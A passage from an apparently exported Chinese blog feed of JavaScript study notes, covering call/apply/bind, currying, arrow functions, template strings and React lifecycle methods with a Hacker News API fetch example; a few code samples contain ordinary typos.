sayHello:function()&#123; console.log(this.name); &#125;.bind(objName)&#125;;obj.sayHello(); //lbh 三者的差别call/apply/bind 都是用来改变 this 指向的，但也有一些小小的差别 123456789101112131415161718function fn(a,b,c,d)&#123; console.log(a,b,c,d);&#125;//callfn.call(null,1,2,3);//applyfn.apply(null,[1,2,3]);//bindvar f = fn.bind(null,1,2,3);f(4);结果如下：1 2 3 undefined 1 2 3 undefined 1 2 3 4 第一个要传入的参数就是要借用的对象，但是这里我们不需要就用了 null 。call 就是挨个传值， apply 是传一个数组， bind 也是挨个传值，但是和 call 与 apply 不同，使用 call 和 apply 都会直接执行这个函数，而 bind 并不直接执行，而是将绑定好的 this 重新返回一个新函数，什么时候调用由自己决定 。也就是说，当你希望改变上下文环境之后并非马上执行的，而是回调执行，就使用 bind 方法，而apply 与 call 则会立即执行函数。 12345678var objName = &#123;name:'lbh'&#125;;var obj = &#123; name:'hello', sayHello:function()&#123; console.log(this.name); &#125;.bind(objName);&#125;obj.sayHello(); //lbh 上述例子之所以使用 bind 的原因也是因为使用 call 会报错，sayHello 在 obj 都已经执行完了，就根本不会有 sayHello 这个函数 apply、call实例数组之间追加1234var array1 = [12,'foo',&#123;name:'joe'&#125;,-2542]var array2 = ['Doe',123,100]Array.prototype.push.apply(array1, array2);// [12,'foo',&#123;name:'joe'&#125;,-2542,'Doe',123,100] 获取数组中的最大值和最小值正常情况下用 Math.max 如下： 1Math.max(10,6) 传一个数组可以用 apply12var arr = [1,2,40,32,5]; console.log(Math.max.apply(null,arr)); // 40 数组本身没有 max 方法，但是 Math 有，可以借助 call 或者 apply 使用其方法。 验证是否是数组（前提是 toString() 方法没有被重写过）123functionisArray(obj)&#123; return Object.prototype.toString.call(obj) === '[object array]'&#125; 伪数组调用数组123456var domNodes = Array.prototype.slice.call(document.getElementsByTagName('*'));function fn()&#123; [].push.call(arguments,3); console.log(arguments); //[1,2,3]&#125;fn(1,2); javaScript 中存在一种名为伪数组的对象结构，比较特别的是 arguments 对象，还有像调用 getElementByTagName ，document.childNodes 之类的，它们返回的 NodeList 对象都属于伪数组。不能应用 Array 下的 push,pop等方法，但是我们可以通过 Array.prototype.slice.call 转换为真正的数组带有 length 属性的对象，这样 domNodes 就可以应用 Array 下的所有方法了。 其他的： 12var arr = ['abds'];console.log(''.indexOf.call(arr,'b')); //3 实际上浏览器的内部并不会在意你是谁，而是关心你传给我的是不是我能够运行的 面试题定义一个 log 方法，让它可以处理 console.log 方法，常见的解决方法是： 12345function log(msg)&#123; console.log(msg);&#125;log(1); // 1log(1,2) // 1 上面的方法可以解决基本的，但当传入的参数不确定的时候，上面的方法就没有用了。这个时候就要考虑使用 apply 或者是 call ，因为传入的参数不确定，最好是用数组的形式来传参，那么就可以使用 apply。 12345function log()&#123; console.log.apply(console,arguments)&#125;log(1); // 1log(1,2) // 1,2 接下来要给每一个 log 消息添加一个前缀“(app)”，比如： 1log('hello world'); //(app)hello world 这个时候可以想到 arguments 参数是一个伪数组，通过 Array.prototype.slice.call 转为标准数组，再使用数组的方法: 12345678910function log()&#123; // 传统方法 Array.prototype.slice.call var args = Array.prototype.slice.call(arguments); // ES6 的 Array.from var args =Array.from(arguments); // ES6 的展开式 var args =[...arguments]; args.unshift('(app)') console.log(console,args);&#125; 可以看看 slice 内部的原理： 1234567891011Array.prototype.slice = function(start,end)&#123; var result = new Array(); start = start || 0; // 如果不传则设置默认值 end = end || this.length; // 如果不传则设置默认值 // this 指向调用的对象，当用了call ，能够改变 this 的指向，也就是传进来的对象，这是关键 for(var i = start; i &lt; end; i++)&#123; result.push(this[i]); &#125; return result;&#125; bind讲解bind 之前先看一道题目 12var altwrite = document.write;altwrite('hello'); 结果是：Uncaught TypeError:Illegal invacation altwrite() 函数改变了 this 的指向 global 或 window 对象，导致执行提示非法调用异常，正确的方案就是使用 bind 方法 1altwrite.bind(document)('hello') 当然也可以使用 call 方法 1altwrite.call(document,'hello') 绑定函数bind 最简单的就是创建一个函数，使得整个函数不论怎么调用都有同样的 this 值，常见的错误就像上面的例子一样，将方法从对象中拿出来，然后调用，并希望 this 指向原来的对象。如果不做特殊处理，一般会丢失原来的对象，使用bind 方法能够漂亮的解决这个问题： 123456789101112this.num = 9;var myModule = &#123; num: 80, getNum: function()&#123; console.log(this.num); &#125;&#125;var getNum = myModule.getNum;getNum(); // 9 在这个例子中， this 指向全局变量var getNum2 = getNum.bind(myModule);getNum2(); // 80 bind 方法与 apply 和 call 相似，也是可以改变函数内的 this 的指向。 MDN 的解释是：bind 方法会创建一个新的函数，称为绑定函数，当调用这个绑定函数的时候，绑定函数会以创建它时传入 bind 方法的第一个参数为 this,传入 bind 方法的第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。 下面是一个具体使用的例子： 123456789var foo = &#123; bar:1, eventBind: function()&#123; var _this = this; $('someClass').on('click',functoin(event)&#123; console.log(_this.bar); //1 &#125;); &#125;&#125; 由于 JavaScript 特有的机制，上下文环境在 eventBind 这个函数过渡到 someClass 的点击函数发生了变化，上述使用变量保存 this 这些方式都是有用的。当然使用 bind 可以更加优雅地解决这个问题。 12345678var foo = &#123; bar:1, eventBind: function()&#123; $('someClass').on('click',functoin(event)&#123; console.log(this.bar); //1 &#125;.bind(this)); &#125;&#125; 上面的代码中，bind 创建 了一个函数，当这个 click 事件绑定在被调用的时候，它的 this 关键字会被设置成传入的值（这里指的是调用 bind 传入的参数）。因此，我们这里想要传入的上下文 this (其实就是 foo)，但bind 函数中。然后当回调函数执行的时候，this 便指向 foo 对象。 另外一个例子： 123456789var bar = function()&#123; console.log(this.x);&#125;var foo = &#123; x:3&#125;bar(); // undefinedvar func = bar.bind(foo);func(); // 3 这里我们创建了一个新的函数，当使用 bind 创建一个绑定函数之后，它被执行的时候，它的 this 会被设置成 foo,而不是像我们调用 bar() 时的全局作用域。 偏函数（Partial Functions）与柯里化（Currying）偏函数定义： Partial application can be described as taking a function that accepts some number of arguments, binding values to one or more of those arguments, and returning a new function that only accepts the remaining, un-bound arguments. 大概的意思就是： 偏函数可以描述为接受一些参数的函数，它将值绑定到一个或者多个参数，返回一个只接受其余未绑定参数的新函数。 这是一个很好的特性，使用 bind 我们设定函数的预定义参数，然后调用的时候传入其他参数就可以了。 1234567function list()&#123; return Array.prototype.slice.call(arguments);&#125;var list1 = list(1,2,3); //[1,2,3]var lending = list.bind(undefined,37); var list2 = lending(); //[37]var list3 = lending(1,2,3); // [37,1,2,3] 与之相似的有一个叫做柯里化的 柯里化柯里化是是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数且返回结果的新函数的技术 两者的区别： 柯里化是将一个多参数函数转换成多个单参数函数，也就是将一个 n 元函数转换成 n 个一元函数 偏函数是固定一个函数的一个或者多个参数，也就是将一个 n 元函数转换成 n - x 元函数。 使用没有上下文的偏函数bind 可以实现偏函数，但是如果要固定一些参数，但是不绑定 this ? 内置的 bind 不允许这样，我们不能忽略上下文并跳转到参数，幸运的是，可以仅绑定 partial 函数容易实现： 123456789101112131415function partial(func,...argsBound)&#123; return function(...args)&#123; return func.call(this,...argsBound,...args); &#125;&#125;let user = &#123; firstName:'John', say(time,phrase)&#123; console.log(`[$&#123;time&#125;] $&#123;this.firstName&#125;: $&#123;phrase&#125;!`); &#125;&#125;// 偏函数，绑定第一个参数，say 的 time user.sayNow = partial(user.say,new Date().getHours() + ':' + new Date().getMinutes());//调用新函数提供的第二个参数 phraseuser.sayNow('Hello'); 调用 partical(func,[arg1,arg2…])函数的结果为调用 func 的包装器（即第一个 return 的函数）： this 一致（因为 user.sayNow 是通过 user 调用的） 然后给其…argsBound ——partical 使用该参数（’时间‘）进行调用 然后提供参数…args——提供给包装器的参数（’Hello‘） 使用 spread 运算符很容易实现 柯里化的实现柯里化是另一种有趣的处理函数的技术：转换一个调用函数f(a,b,c)为 f(a)(b)(c)的方式调用。让我们实现柯里化函数，执行一个两元参数函数，即转换f(a,b)至f(a)(b) 12345678910111213function curry(func)&#123; return function(a)&#123; return function(b)&#123; return func(a,b) &#125; &#125;&#125;function sum(a,b)&#123; return a + b;&#125;let carriedSum = curry(sum);console.log(carriedSum(1)(2)); 上面是通过一系列包装器实现的。 curry(func)的结果是 function(a) 的一个包装器 当调用sum(1) ，参数被保存在词法环境中，然后返回新的包装器funtion(b) 然后 sum(1)(2)提供 2 并最终调用 function(b)，然后传递调用给原始多参数函数 sum 高级柯里化实现有一些柯里化的高级实现，可以实现更加复杂的功能：其返回一个包装器，它允许函数提供全部参数被正常调用，或返回偏函数，实现如下： 123456789101112131415161718192021function curry(func)&#123; return function curried(...args)&#123; if(args.length &gt;= func.length)&#123; // 如果参数大于等于函数参数，那么运行函数提供全部参数被正常调用 return func.apply(this,args); &#125;else&#123; // 提供参数小于函数参数，返回偏函数 return function pass(...args2)&#123; return curried.apply(this,args.concat(args2)); &#125; &#125; &#125;&#125;function sum(a,b,c)&#123; return a + b + c;&#125;let curriedSum = curry(sum);// 提供全部参数，正常调用console.log(curriedSum(1,2,3));// 返回偏函数包装器，并且提供2,3参数console.log(curriedSum(1,2)(3)); 当我们运行的时候，有两个分支： 提供全部参数正常调用，如果传递 args 数与原来的函数定义的参数个数一样或者更长，直接调用 获得偏函数，否则，不调用func 函数，返回另一个包装器，提供连接之前的参数一起作为新的参数重新调用 curried ，返回一个新偏函数（如果参数不够）或最终结果。 上面的例子中，调用 curriedSum(1)(2)(3)的过程： 第一次调用 curried(1)，在词法环境中记住1，返回包装器 pass 使用参数 2 调用包装器，其带着前面的参数1，连接它们然后调用 curried(1,2)，因为参数数量仍然小于3，返回包装器 pass 再次调用包装器 pass,带着之前的参数（1，2）,加上3，并调用 curried(1,2,3)。最终有三个参数，传递给原函数，因为参数个数相等，直接调用 func 函数。 还有一种性能更加好的，不过判断条件反过来的写法: 1234567891011121314function curry(func)&#123; function curried(restProp,argsList)&#123; return restProp === 0 ? fn.apply(null,argsList):function(x)&#123; return curried(restProp - 1,argsList.concat(x)); &#125; &#125; return curried(func.length,[]);&#125;// ES6的写法const curry = func =&gt;&#123; const curried = (restProp,argsList)=&gt; restProp === 0 ?fn(...argsList):x=&gt;curried(restProp - 1,argsList.concat(x)); return curried(func.length,[])&#125; 总结 当把已知的一些参数固定，结果参数被称为偏函数，通过使用bind 获得偏函数，也有其他方式实现。 用途：当我们不想重复多次调用相同的参数的时候，偏函数是很便捷的，有 send(from,to)函数，如果 from 总是相同的，可以使用偏函数简化调用 柯里化是转换函数调用从 f(a,b,c)至f(a)(b)(c)，JavaScript 通常既可以实现正常调用，也可以实现参数不足时的偏函数方式的调用。 用途： 参数返回 提前返回 延迟计算或运行，参数随意设置 提前返回，常见的例子：兼容现代浏览器以及 IE 浏览器的事件添加方法 1234567891011var addEvent = function(el,type,fn,callback,capture)&#123; if(window.addEventListener)&#123; el.addEventListener(type,function(e)&#123; fn.call(el,e); &#125;,capture) &#125;else if(window.attackEvent)&#123; el.attackEvent('on'+type,function(e)&#123; fn.call(el,e); &#125;) &#125;&#125; 上面的方法有一个问题，就是每次用 addEvent 为元素添加事件的时候，(ie7/8)都会走一遍if..else if 其实只要判定一次就好了。这个时候就可以采用柯里化了。 123456789101112131415var addEvent = (function()&#123; if(window.addEventListener)&#123; return function(el,type,fn,capture)&#123; el.addEventListener(type,function(e)&#123; fn.call(el,e); &#125;,capture) &#125; &#125;else if(window.attackEvent)&#123; return function(el,type,fn,capture)&#123; el.attackEvent('on'+type,function(e)&#123; fn.call(el,e); &#125;) &#125; &#125;&#125;); 初始addEvent的执行其实只实现了部分的应用（只有一次的if…else if…判定），而剩余的参数应用都是其返回函数实现的，典型的柯里化思想。 和 setTimeout 一起使用12345678910111213function Bloomer()&#123; this.petalCount = Math.ceil(Math.random() * 12) + 1;&#125;// 1 秒后用 declare 函数Bloomer.prototype.bloom = function()&#123; window.setTimeout(this.declare.bind(this),1000);&#125;Bloomer.prototype.declare = function()&#123; console.log(`我有 $&#123;this.petalCount&#125;朵花瓣！`);&#125;var bloo = new Bloomer();bloo.bloom(); //我有5朵花瓣！ 捷径bind()也可以为需要特定this值的函数创造捷径。 例如：要将一个类数组转换成为数组，当然这个是在出现ES6之前的 1234var unBoundSlice = Array.prototype.slice;var slice = Function.prototype.call.bind(unBoundSlice);slice(arguments); 实现首先我们可以通过给目标函数指定作用域来简单实现 bind 方法 123456Function.prototype.bind = function(context)&#123; self = this; // 保存 this，即调用 bind 方法的目标函数 return function()&#123; return self.apply(context,arguments); &#125;&#125; 考虑到柯里化的情况，我们可以构建一个更加健壮的bind() 123456789Function.prototype.bind = function(context)&#123; var args = Array.prototype.slice.call(arguments,1); self = this; return function()&#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = args.concat(innerArgs); return self.apply(context,finalArgs); &#125;&#125; 这次的bind 方法可以绑定对象，也支持在绑定的时候传参。 JavaScript 的函数还可以作为构造函数，那么绑定后的函数用这种方式调用时，情况就比较微妙了，需要涉及到原型链的传递： 12345678910111213Function.prototype.bind = function(context)&#123; var args = Array.prototype.slice(arguments,1), F = function()&#123;&#125;, self = this, bound = function()&#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = args.concat(innerArgs); return self.apply((this instanceof F ? this : context),finalArgs); &#125; F.prototype = self.prototype; bound.prototype = new F(); return bound;&#125; 这是《JavaScript Web Application》一书中对bind()的实现：通过设置一个中转构造函数F，使绑定后的函数与调用bind()的函数处于同一原型链上，用new操作符调用绑定后的函数，返回的对象也能正常使用instanceof，因此这是最严谨的bind()实现。 对于为了在浏览器中能支持bind()函数，只需要对上述函数稍微修改即可： 1234567891011121314151617181920Function.prototype.bind = function (oThis) &#123; if (typeof this !== "function") &#123; throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable"); &#125; var aArgs = Array.prototype.slice.call(arguments, 1), fToBind = this, fNOP = function () &#123;&#125;, fBound = function () &#123; return fToBind.apply( this instanceof fNOP &amp;&amp; oThis ? this : oThis || window, aArgs.concat(Array.prototype.slice.call(arguments)) ); &#125;; fNOP.prototype = this.prototype; fBound.prototype = new fNOP(); return fBound;&#125;; 有一个有趣的问题，如果连续 bind 两次或者是三次，那么输出的结果是什么？ 123456789101112131415161718192021var bar = function()&#123; console.log(this.x);&#125;var foo = &#123; x:3&#125;var sed = &#123; x:4&#125;var func = bar.bind(foo).bind(sed);foo(); // ?var fix = &#123; x:5&#125;var func = bar.bind(foo).bind(sed).bind(fiv);func(); // ？ 答案是。两次仍然将输出3，原因是在 JavaScript 中，多次的 bind 是无效的。更深层的原因是，bind 的实现相当于使用函数在内部包了一个 call/apply，两次 bind 相当于再包住第一次的 bind,故第二次以后的 bind 是无法生效的。 参考链接：JS中的call、apply、bind方法详解 js基础进阶–关于Array.prototype.slice.call(arguments) 的思考 JS中的柯里化 及 精巧的自动柯里化实现 理解JS里的偏函数与柯里化]]></content>
      <categories>
        <category>ES6相关</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Arrow_functions]]></title>
    <url>%2F2018-06-11-Arrow-function.html</url>
    <content type="text"><![CDATA[箭头函数基础语法 (参数1,参数2,…参数N) =&gt;{函数声明}(参数1,参数2,…参数N) =&gt; 表达式(单一)//相当于：(参数1,参数2,…参数N) =&gt;{return 表达式;} //当只有一个参数时，圆括号是可选的:(单一参数) =&gt; {函数声明}单一参数 =&gt; {函数声明} //无参数的函数应该写成一对圆括号() =&gt; {函数声明} 高级语法 //加括号的函数体返回对象字面表达式参数 =&gt;({foo:bar}) //支持剩余参数和默认参数(参数1,参数2,…rest) =&gt; {函数声明}(参数1 = 默认值1,参数2,…参数N = 默认值N) =&gt; {函数声明} //同样支持参数列表解构let f = ([a,b] = [1,2],{x:c} = {x: a + b}) =&gt; a + b +c;f(); //6 描述引入箭头函数有两个方面的作用：更简短的函数并且不绑定 this 12345678910var a = ['fiftyfifty','done','you','goodjob'];a.map(function(a)&#123; return a.length;&#125;); //[10,4,3,7]a.map(a) =&gt; &#123; return a.length;&#125; //[10,4,3,7]a.map(a =&gt; a.length); //[10,4,3,7] 不绑定 this在箭头函数出现之前，每个新定义的函数都有自己的 this 值(在构造函数的情况下是一个新对象，在严格模式的函数调用中为 undefined,如果该函数被称为“对象方法” 则为基础对象等 ) 123456789101112funtion Person()&#123; //Person() 构造函数定义 `this` 作为自己的实例 this.age = 0; setInterval(function growUp()&#123; //在非严格模式，growUp()函数定义 `this` 作为全局对象, //在与Person() 构造函数中定义的 `this` 并不相同 this.age++; &#125;,1000);&#125;var p = new Person(); 在 ECMAScript 3/5 中，通过将 this 值分配给封闭的变量，可以解决 this 问题。 12345678function Person()&#123; var that = this; this.age = 0; setIntervar(function growUp()&#123; //回调引用的是 `that` 变量，其值是预期的对象 that.age++; &#125;,1000);&#125; 或者，可以创建绑定函数，以便将预先分配的 this 值传递到绑定的目标函数上 箭头函数不会创建自己的 this ,它会从自己的作用域链的上一层继承 this .因此，在下面的代码中，传递给 setInterval 的函数内的 this 与封闭函数中的 this 相同 1234567function Person()&#123; this.age = 0; setInterval(() =&gt;&#123; this.age++; //|this| 正确指向 person 对象 &#125;,1000);&#125;var p = new Person(); 通过 call 或者 apply 调用由于箭头函数没有自己的 this 指针，通过 call() 或者 apply() 方法调用一个函数时，只能传递参数 1234567891011121314151617var adder = &#123; base:1, add:function(a)&#123; var f = v =&gt; v + this.base; return f(a); &#125;, addThruCall: function(a)&#123; var f = v =&gt; v + this.base; var b = &#123; base: 2 &#125;; return f.call(b,a); &#125;&#125;console.log(adder.add(1)); //2console.log(adder.addThruCall(1)); //2 不是3 不绑定 arguments箭头函数不绑定 arguments 对象，在下例中， arguments 只是引用了封闭作用域内的 arguments 123456789var arguments = [1,2,3];var arr = () =&gt; arguments[0];arr(); //1function foo(n)&#123; var f = () =&gt; arguments[0] + n; //隐式绑定 foo 函数的 arguments 对象，arguments[0] 是 n return f();&#125;foo(1); //2 大多数情况下，使用剩余参数是相较使用 arguments 对象的更好选择 123456function foo()&#123; var f = (...args) =&gt; args[0]; return f(2);&#125;foo(1); //2 像方法一样使用箭头函数123456789101112'use strict';var obj = &#123; i:10, b:() =&gt; console.log(this.i,this), c:function()&#123; console.log(this.i,this); &#125;&#125;obj.b();//undefinedobj.c();//10,Object&#123;...&#125; 使用 new 操作符箭头函数不能用作构造器，和 new 一起用会抛出错误 var Foo = () =&gt;{};var foo = new Foo(); //TypeError:Foo is not a constructor 使用 prototype 属性箭头函数没有 prototype 属性 var Foo = () =&gt;{}console.log(Foo.prototype); //undefined 函数体箭头函数可以有一个简写体或者是常见的块体在一个简写体重，只需要一个表达式，并附加一个隐式的返回值，在块体中，必须使用明确的 return 语句 var func = x =&gt; x * x;//简写函数 省略return var func = (x,y) =&gt; {return x+y;};//常规编写，明确的返回值 返回对象字面量使用 params =&gt;{object:literal} 这种简单的语法返回对象字面量是行不通的记得用圆括号把字面量包起来 var func = () =&gt; ({foo:1}); 换行箭头函数在参数和箭头之间不能换行 解析顺序虽然箭头函数中的箭头不是运算符，但箭头函数具有与常规函数不同的特殊运算符优先级解析规则 12345678910let callback;callback = callback || function()&#123;&#125;; //okcallback = callback || (() =&gt;&#123;&#125;); //ok//空的箭头函数返回 undefinedlet empty = () =&gt; &#123;&#125;(() =&gt; 'foobar')();//Return "foobar"//这是一个立即执行函数表达式 箭头函数也可以使用条件（三元）运算符：12345var simple = a =&gt; a &gt; 15 ? 15 : a;simple(16); //15simple(10); //10let max = (a,b) =&gt; a &gt; b ? a : b; 箭头函数内定义的变量及其作用域123456789101112131415//常规写法var greeting = () =&gt; &#123; let now = new Date();return("Good" + ((now.getHours() &gt; 17) ? "evening." : "day."));&#125;console.log(now); // ReferenceError: now is not defined 标准的let作用域// 参数括号内定义的变量是局部变量（默认参数）var greeting = (now = new Date()) =&gt; "Good" + ((now.getHours() &gt; 17) ? "evening." : "day.");console.log(now); // ReferenceError: now is not defined//对比：函数体内&#123;&#125; 不使用var 定义的变量是全局变量var greeting = () =&gt; &#123;now = new Date(); return ("Good" + ((now.getHours() &gt; 17) ? "evening." : "day."));&#125;console.log(now); // Fri Dec 22 2017 10:01:00 GMT+0800 (中国标准时间)//对比：函数体内用&#123;&#125; 用var定义的变量是局部变量var greeting = () =&gt;&#123;var now = new Date(); return ("Good" + ((now.getHours() &gt; 17) ? "evening." : "day."));&#125;console.log(now); // ReferenceError: now is not defined 箭头函数也可以使用闭包1234567891011121314151617181920//标准的闭包函数function A()&#123; var i = 0; return function b()&#123; return (++i); &#125;;&#125;;var v = A();v(); //1v(); //2//箭头函数体的闭包 (i=0 是默认参数)var Add = (i=0) =&gt; &#123;return (() =&gt; (++i))&#125;;var v = Add();v(); //1v(); //2//因为只有一个返回，return 以及括号也可以省略var Add = (i=0) =&gt; (++i);]]></content>
      <categories>
        <category>ES6相关</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[template_strings]]></title>
    <url>%2F2018-06-09-templateString.html</url>
    <content type="text"><![CDATA[模板字符串模板字面量是允许嵌入表达式的字符串字面量 `string text` `string text line 1` `string text line 2` `string text ${expression} string text` tag `string text ${expression} string text` 描述模板字符串使用反引号（``）来代替普通字符串中的双引号和单引号。模块字符串可以包含特殊语法（${expression}）的占位符。占位符中的表达式和周围的文本会一起传递给一个默认函数，该函数负责将所有的部分连接起来，如果一个模板字符串由表达式开头，则该字符串被称为带标签的模板字符串，该表达式通常是一个函数，它会在模板字符串处理后被调用，在输出最终结果前，都可以使用该函数来对模板字符串进行操作处。在模板字符串内使用反引号（`）时，需要在它的前面加转移符（\） `\ === “`“ //–&gt; true 多行字符串在新行中插入任何字符都是模板字符串的一部分，使用普通字符串，可以通过以下方式获得多行字符串 console.log(`string text line 1\n`+`string text line 2`);//“string text line 1//string text line 2” 获得同样的多行字符串，只需使用以下代码 console.log(`string text line 1 string text line 2`);//“string text line 1//string text line 2” 插入表达式在普通字符中插入表达式 var a = 5;var b = 10;console.log(‘sum is’ +(a+b) + ‘and\ndoubleSum is ‘ + (a+b)*2 +’.’ );//sum is 15 and//doubleSum is 30. 通过模板字符串由更优雅的方式来表示 var a = 5;var b = 10;console.log(` sum is ${a+b} and doubleSum is ${(a+b)*2}. `); 嵌套模板在某些时候，嵌套模板具有可配置字符串的最简单也是更可读的方法，在模板中，只需在模板内的占位符 ${} 内使用它们，就可以轻松地使用内部反引号。 例如：如果条件a是真的，那么就返回这个模板化的文字 ES5： var classes = ‘hander’classes += (‘isLargeScreen() ? ‘’: item.isCollapsed ? ‘icon-expander’ : ‘icon-collapser’); ES6使用模板文字没有嵌套 const classes = `header ${isLargeScreen() ? ‘’ : (item.isCollapsed) ? ‘icon-expander’ : ‘icon-collapser’)}`; ES6使用嵌套模板字面量 const classes = `header ${isLargeScreen() ? ‘’ : `icon-${item.isCollapsed ? ‘expander’ : ‘collapser’}`}`; 带标签的模板字符串更高级的形式的模块字符串是带标签的模块字符串。标签可以用函数解析模块字符串。标签函数的第一个参数包含一个字符串值的数组，其余的参数与表达式相关。最后，函数可以返回处理好的字符串。用于该标签的函数的名称可以被命名为任何名字 12345678910111213141516var person = 'Mike'; var age = 28; function myTag(strings,personExp,ageExp)&#123; var str0 = string[0]; var str1 = string[1]; var ageStr; if(ageStr &gt; 99)&#123; ageStr = 'centenarian'; &#125; else&#123; ageStr = 'youngster'; &#125; return str0 + personExp + str1 + ageStr;&#125;var output = myTag `that $&#123;person&#125; is a $&#123;age&#125;`.;console.log(output); // that Mike is a youngster. 原始字符串在标签函数的第一个参数中，存在一个特殊的属性 raw,我们可以通过它来访问模板字符串的原始字符串，而不经过特殊字符串的替换 1234567function tag(strings)&#123; console.log(strings.raw[0]);&#125;tag `string text line1 \n string text line 2`// logs "string text line 1 \n string text line 2"// including the two characters '\' and 'n' 另外使用 String.raw() 方法创建原始字符串和使用默认模板函数和字符串连接创建是一样的 12345678var str = String.raw`Hi\n$&#123;2+3&#125;!` //Hi\n5!str.length;//6//str.split('').join(',');//"H,i,\,n,5,!" 带标签的模版字面量及转义序列自ES2016起，带标签的模版字面量遵守以下转义序列的规则： Unicode字符以”\u”开头，例如\u00A9Unicode码位用”\u{}”表示，例如\u{2F804}十六进制以”\x”开头，例如\xA9八进制以”\”和数字开头，例如\251这表示类似下面这种带标签的模版是有问题的，因为对于每一个ECMAScript语法，解析器都会去查找有效的转义序列，但是只能得到这是一个形式错误的语法： latex`\unicode` // 在较老的ECMAScript版本中报错（ES2016及更早） // SyntaxError: malformed Unicode character escape sequence]]></content>
      <categories>
        <category>ES6相关</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road to learn React Part3]]></title>
    <url>%2F2018-06-08-TheRoadtolearnReactPart3.html</url>
    <content type="text"><![CDATA[The Road to learn React书籍学习笔记(第三章)代码详情 声明周期方法通过之前的学习，可以了解到ES6 类组件中的生命周期方法 constructor() 和 render()constructor() 构造函数只有在组件实例化并插入到 DOM 中的时候才会被调用。组件实例化的过程称为组件的挂载 mountrender()方法也会在组件挂载过程中被调用，同时组件更新的时候也会被调用。每当组件的状态 state 和属性 props 改变的时候，组件的 render() 方法都会被调用 挂载过程中有四个生命周期方法，调用顺序是这样的constructor()componentWillMount()render()componentDidMount() 当组件的状态或者属性改变的时候用来更新的生命周期如下五个步骤componentWillReceiveProps()shouldComponentUpdate()componentWillUpdate()render()componentDidUpdate() 组件卸载的生命周期只有一个componentWillUnmount() 生命周期详解constructor(props)在组件初始化的时被调用，在这个方法中，可以设置初始化状态以及绑定类方法 componentWillMount()在 render() 方法之前被调用，这就是为什么它可以用作去设置组件内部的状态，因为它不会触发组件的再次渲染，一般还是推荐在 constructor() 中去初始化状态 componentDidMount()仅在组件挂载后执行一次，是发起异步请求去API 获取数据的最好时期，获取到的数据将被保存在内部组件的状态中然后在 render() 生命周期方法中展示出来 componentWillReceviceProps(nextProps)这个方法在一个更新声明周（update lifecycle）中使用， 新的属性会作为它的输入，因此可以利用 this.props 来对比之后的属性和之前的属性，基于对比的结果去实现不同的行为，此外还可以基于新的属性来设置组件的状态 shouldComponentUpdate(nextProps,nextState)每次组件因为状态或者是属性更改而更新时，它都会被调用。在成熟的React应用中使用它来进行性能优化。在一个更新声明周期中，组件以及其组件将根据该方法返回的布尔值来决定是否重新渲染，这样就可以阻止组件的渲染声明周期方法，避免不必要的渲染 componentWillUpdate(nextProps,nextState)这个方法是 render() 方法执行之前的最后一个方法，此时拥有了下一个属性和状态，可以利用这个方法在渲染之前做最后的准备。注意这个声明周期不能再触发 setState() 如果想基于新的属性计算状态 ,必须使用 componentWillReceiveProps() componentDidUpdate(prevProps,prevState)这个方法在 render() 之后调用，可以用它当成操作DOM 或者是 执行更多异步请求的机会 componentWillUnmount()它会在组件销毁之前被调用，可以利用这个声明周期方法去执行任何清理任务 render() 是必须有的，否则不会返回一个组件实例 还有一个生命周期方法componentDidCatch(error,info)在 React 16 中引入，用来捕获组件的错误。举例来说，在你的应用中展示样本数据本来是没问题的。但是可能会有列表的本地状态被意外设置成 null 的情况发生（例如从外部 API 获取列表失败时，你把本地状态设置为空了）。然后它就不能像之前一样去过滤（filter）和映射（map）这个列表，因为它不是一个空列表（[]）而是 null。这时组件就会崩溃，然后整个应用就会挂掉。现在你可以用componentDidCatch() 来捕获错误，将它存在本地的状态中，然后像用户展示一条信息，说明应用发生了错误 获取数据从 Hacker News API 获取数据。可以在 componentDidMount() 生命周期方法来获取数据,用JavaScript原生的 fetch API 来发起请求在那之前，先设置好 URL常量和默认参数，将 API 请求分解成几步 1234567891011121314import React,&#123; Component &#125; from &apos;react&apos;;import &apos;./App.css&apos;const DEFAULT_QUERY = &apos;redux&apos;;const PATH_BASE = &apos;https://hn.algolia.com/api/v1&apos;;const PATH_SEARCH = &apos;/search&apos;;const PARAM_SEARCH = &apos;query=&apos;;在ES6 中 可以用模板字符串（`template strings`） 来连接字符串//ES6 const url = `$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;DEFAULT_QUERY&#125;`;//ES5 var url = PATH_BASE + PATH_SEARCH +&apos;?&apos; + PARAM_SEARCH + DEFAULT_QUERY; 123456789101112131415161718192021222324252627282930313233343536...class App extends Component &#123;constructor(props) &#123; super(props); this.state = &#123; result: null, searchTerm: DEFAULT_QUERY, &#125;; this.setSearchTopStories = this.setSearchTopStories.bind(this); this.fetchSearchTopStories = this.fetchSearchTopStories.bind(this); this.onSearchChange = this.onSearchChange.bind(this); this.onDismiss = this.onDismiss.bind(this);&#125;setSearchTopStories(result) &#123; this.setState(&#123; result &#125;);&#125;fetchSearchTopStories(searchTerm) &#123; fetch(`$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;searchTerm&#125;`) .then(response =&gt; response.json()) .then(result =&gt; this.setSearchTopStories(result)) .catch(e =&gt; e);&#125;componentDidMount() &#123; const &#123; searchTerm &#125; = this.state; this.fetchSearchTopStories(searchTerm);&#125;...&#125; 从 Hacker News API 得到一个真实的列表。组件将一个空的列表结果以及一个默认的搜索词作为初始状态。这个默认搜索词也同样用在 Search 组件的输入字段和第一个 API 请求中。 其次，在组件挂载之后，它用了 componentDidMount()生命周期方法去获取数据。在第一次获取数据时，使用的是本地状态中的默认搜索词。它将获取与 “redux” 相关的资讯，因为它是默认的参数。 再次，这里使用的是原生的 fetch API。JavaScript ES6 模板字符串允许组件利用 searchTerm 来组成 URL。该 URL 是原生 fetch API 函数的参数。返回的响应需要被转化成 JSON 格式的数据结构。这是在处理 JSON 数据结构时，原生的 fetch API 